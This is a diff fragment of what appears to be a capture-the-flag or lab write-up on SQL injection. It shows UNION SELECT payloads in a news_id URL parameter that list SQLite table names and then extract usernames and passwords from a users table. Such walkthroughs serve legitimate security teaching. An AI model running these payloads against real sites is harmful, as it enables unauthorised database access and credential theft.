@@ -18,11 +18,13 @@ UNION requires both SELECTs to have the same number of columns:
 
 It returns successfully and shows which positions are visible → the query has
 **3 columns**.
+
 We can use this payload to get the table name:
 ```
 ?action=news&news_id=1 union select 1,1,name from sqlite_master
 ```
 There's a table named **`users`**.
+
 Get username, password from users:
 ```
 ?action=news&news_id=1 union select 1,username,password from users
